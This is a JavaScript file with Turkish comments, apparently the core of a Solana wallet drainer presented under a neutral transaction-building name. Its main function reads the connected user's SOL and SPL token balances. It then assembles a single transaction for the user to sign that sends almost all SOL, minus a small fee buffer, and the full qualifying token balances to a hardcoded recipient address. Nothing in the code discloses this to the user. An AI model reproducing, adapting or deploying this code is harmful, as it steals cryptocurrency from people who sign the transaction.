/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

// RPC Throttle
const BATCH_SIZE = 3;
const BATCH_DELAY_MS = 1000;

/**
 * Verilen async görevleri en fazla BATCH_SIZE tanesini aynı anda çalıştırır,
 * sonra BATCH_DELAY_MS milisaniye bekler, sonra kalanları çalıştırır.
 */
async function runBatches(tasks) {
  const results = [];
  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
    const res = await Promise.all(batch);
    results.push(...res);
    if (i + BATCH_SIZE < tasks.length) {
      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
    }
  }
  return results;
}

/** Mint hesabının owner’ına bakarak hangi token programı (legacy / 2022) olduğunu tespit eder. */
async function detectTokenProgramId(mintPubkey) {
  const info = await connection.getAccountInfo(mintPubkey);
  if (!info) return TOKEN_PROGRAM_ID; // güvenli varsayılan (çoğu mint legacy)
  const owner = info.owner;
  if (owner.equals(TOKEN_PROGRAM_ID)) return TOKEN_PROGRAM_ID;
  if (owner.equals(TOKEN_2022_PROGRAM_ID)) return TOKEN_2022_PROGRAM_ID;
  return owner; // çok nadir özel durumlar için
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");

  // SOL bakiyesi kontrolü
  const userSolLamports = await connection.getBalance(payer);
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // 0) Her mint için programId tespiti (owner = token program)
  const programDetectTasks = TOKEN_CONFIGS.map(({ mint }) => async () => {
    const programId = await detectTokenProgramId(mint);
    return { mint, programId };
  });
  const programPairs = await runBatches(programDetectTasks);
  const programByMint = new Map(programPairs.map((x) => [x.mint.toBase58(), x.programId]));

  // 1) Kullanıcı bakiyelerini batch'li olarak oku (her task 1 RPC)
  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
    const programId = programByMint.get(mint.toBase58()) || TOKEN_PROGRAM_ID;

    // Doğru programId ile ATA türet
    const userAta = await getAssociatedTokenAddress(
      mint,
      payer,
      false,
      programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    let amount = 0n;
    let sufficient = false;

    try {
      const acct = await getAccount(connection, userAta, undefined, programId);
      amount = acct.amount; // bigint
      const th = BigInt(threshold ?? 0);
      // Eşik kontrolünü >= yap (eşit miktarı da kabul et)
      sufficient = amount >= th;
    } catch {
      sufficient = false;
    }

    const toAta = await getAssociatedTokenAddress(
      mint,
      toPublicKey,
      false,
      programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    // Alıcı ATA var mı? (ATA oluşturmayacağız; yoksa bu tokenı atla)
    let toAtaExists = true;
    try {
      await getAccount(connection, toAta, undefined, programId);
    } catch {
      toAtaExists = false;
    }

    return { mint, programId, userAta, toAta, amount, sufficient, toAtaExists };
  });
  const userTokenInfos = await runBatches(balanceTasks);

  // 2) Instruction'ları sırayla derle
  const instructions = [];

  // 2a) SOL transfer instruction
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // 2b) SPL-token transfer (ATA oluşturma YOK; yalnızca mevcut ATA'lara)
  for (const { userAta, toAta, amount, sufficient, programId, toAtaExists, mint } of userTokenInfos) {
    if (!sufficient) continue;
    if (!toAtaExists) {
      console.warn(
        `Alıcı ATA yok, atlandı → mint=${mint.toBase58()} programId=${programId.toBase58()}`
      );
      continue;
    }

    // Doğru programId ile transfer (unchecked yeterli; istersen checked'e geçebiliriz)
    instructions.push(
      createTransferInstruction(
        userAta,
        toAta,
        payer,
        amount,         // bigint
        [],             // multisig yok
        programId       // ÖNEMLİ: mint'in gerçek token programı
      )
    );
  }

  // Hiçbir varlık yeterli değilse çık (SOL yok + SPL eklenemedi)
  const hasAnySpl = instructions.some(ix =>
    // basit kontrol: ProgramId token programlarından biri mi
    ix.programId.equals(TOKEN_PROGRAM_ID) || ix.programId.equals(TOKEN_2022_PROGRAM_ID)
  );
  if (!isSolSufficient && !hasAnySpl) {
    console.warn("Yeterli bakiye yok (ne SOL ne de SPL) veya SPL için koşullar sağlanmadı!");
    return null;
  }

  // 3) Tek bir VersionedTransaction oluştur
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  // Debug
  try {
    const rows = userTokenInfos.map((t) => ({
      mint: t.mint.toBase58(),
      prog: t.programId.equals(TOKEN_PROGRAM_ID)
        ? "TOKEN_PROGRAM"
        : t.programId.equals(TOKEN_2022_PROGRAM_ID)
        ? "TOKEN_2022"
        : t.programId.toBase58(),
      userAta: t.userAta.toBase58(),
      toAta: t.toAta.toBase58(),
      amount: t.amount.toString(),
      sufficient: t.sufficient,
      toAtaExists: t.toAtaExists,
    }));
    console.table(rows);
    console.log("SOL to send (lamports):", solToSend);
  } catch {}

  return new VersionedTransaction(messageV0);
}
